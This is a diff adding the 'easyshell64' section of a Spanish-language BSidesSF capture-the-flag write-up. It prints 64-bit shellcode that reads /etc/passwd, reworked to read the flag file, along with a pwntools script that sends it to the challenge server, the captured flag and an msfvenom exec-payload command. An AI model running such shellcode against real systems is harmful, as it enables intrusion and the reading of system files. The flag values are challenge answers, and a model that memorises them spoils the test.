@@ -46,4 +46,68 @@ conn.close()
 
 FLAG:c832b461f8772b49f45e6c3906645adb
 
+##### easyshell64
+
+En este caso echamos mano de shell-storm.org, ya que metasploit no tiene un payload para leer archvios en 64 bits. En concreto cogemos el payload http://shell-storm.org/shellcode/files/shellcode-878.php
+
+```
+\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
+```
+
+Este payload está diseñado para leer /etc/passwd, lo que tendremos que hacer es quitar los carácteres en hexadecimal que corresponden a esa cadena y sustituirlos por las de nuestro archivo a leer /home/ctf/flag.txt. Por lo tanto el cutre script queda de la siguiente manera:
+
+```python
+#!/usr/bin/env python
+import sys
+from pwn import *
+
+buf = "\xeb\x3f\x5f\x80\x77\x12\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x63\x74\x66\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x41"
+
+addr = "easyshell64-efb598a6.ctf.bsidessf.net"
+conn = remote(addr, 5253)
+
+conn.send(buf)
+conn.interactive()
+conn.close()
+```
+
+Si lo ejecutamos:
+
+```
+python otro.py 
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[+] Opening connection to easyshell64-efb598a6.ctf.bsidessf.net on port 5253: Done
+[*] Switching to interactive mode
+Send me stuff!! We're 64 bits!
+FLAG:e8864c381822ec7cf97f5516745411f5
+$  [*] Got EOF while reading in interactive
+```
+
+Luego descubrí que hay otra manera más sencilla usando el payload de 64 bits de metasploit siguiente:
+
+```
+msfvenom -p linux/x64/exec CMD="cat /home/ctf/flag.txt" -n 16 -b '\x00\x20\x0d\x0a' -f python
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
